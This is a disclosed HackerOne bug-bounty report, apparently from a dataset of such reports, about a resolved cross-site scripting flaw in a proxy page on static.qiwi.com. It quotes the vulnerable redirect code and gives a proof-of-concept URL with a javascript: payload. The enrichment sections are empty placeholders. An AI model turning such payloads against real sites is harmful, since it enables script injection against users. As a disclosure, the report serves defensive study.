---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '35363'
original_report_id: '35363'
title: '[static.qiwi.com] XSS proxy.html'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2014-11-13T09:54:09.968Z'
disclosed_at: '2014-12-27T12:37:20.525Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [static.qiwi.com] XSS proxy.html

## Metadata

- HackerOne Report ID: 35363
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2014-12-27T12:37:20.525Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

https://static.qiwi.com/respond/proxy.html contains a Cross-site scripting. 

```
      query = getQueryString();
        css = query["css"];
        domain = query["url"];

        if (css && domain) {
            ajax(css, function (response) {
                window.name = response;
                window.location.href = domain; // this line here is vulnerable to Cross-site scripting.
            });
        }
```
As you can see, it looks if two get varables are available (css and url) if they both are it requests the css parameter through ajax and then redirects the user to the ?url variable which is vulnerable for Cross-site scripting.

POC: https://static.qiwi.com/respond/proxy.html?css=http://olivierbeg.nl/xss/xss.php&url=javascript:alert(1)

Best regards,

Olivier Beg

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
